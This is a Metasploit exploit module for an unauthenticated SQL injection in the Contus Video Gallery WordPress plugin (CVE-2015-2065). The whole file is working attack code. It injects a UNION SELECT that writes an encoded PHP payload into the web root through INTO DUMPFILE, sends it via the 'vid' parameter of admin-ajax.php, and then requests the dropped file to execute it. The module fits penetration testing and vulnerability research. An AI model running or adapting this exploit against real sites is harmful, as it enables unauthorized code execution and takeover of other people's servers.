##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'rexml/document'

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Contus Video Gallery for Wordpress Unauthenticated SQL Injection Remote Code Execution',
      'Description'    => %q{
      },
      'Author'         => [
        'Brandon Perry <bperry.volatile[at]gmail.com>' # Discovery / msf module
      ],
      'License'        => 'VolatileMinds',
      'References'     =>
        [
          ['CVE', '2015-2065'],
        ],
      'Payload'	=>
        {
          'Space' => 21244,
          'DisableNops' => true,
          'BadChars' => ''
        },
      'Targets'	=>
        [
          [ 'Automatic Target', { } ]
        ],
      'Privileged' => false,
      'Platform' => ['php'],
      'Arch' => ARCH_PHP,
      'DisclosureDate' => 'Feb 12 2015',
      'DefaultTarget' => 0))

      register_options([
        OptString.new('FILEPATH', [ true, "The directory to attempt writing the payload to", "/var/www/html/"]),
        OptString.new('RELATIVEURI', [true, "The relative URI of the path containing the payload to hit over HTTP", '/']),
        OptString.new('TARGETURI', [true, 'The relative URI of the wordpress installation', '/'])
      ], self.class)
  end

  def exploit
    filename = Rex::Text.rand_text_alpha(5)

    new_payload = "<?php " + payload.encoded + " ?>"

    send_payload = "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0x#{new_payload.unpack("H*")[0]},NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL INTO DUMPFILE '#{datastore['FILEPATH']}/#{filename}.php'-- "

    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
      'vars_get' => {
        'action' => 'rss',
        'type' => 'video',
        'vid' => '-1 ' + send_payload
      }
    })

    register_files_for_cleanup(filename+'.php')

    send_request_cgi({
      'uri' => normalize_uri(datastore['RELATIVEURI'], filename + '.php')
    })

  end
end
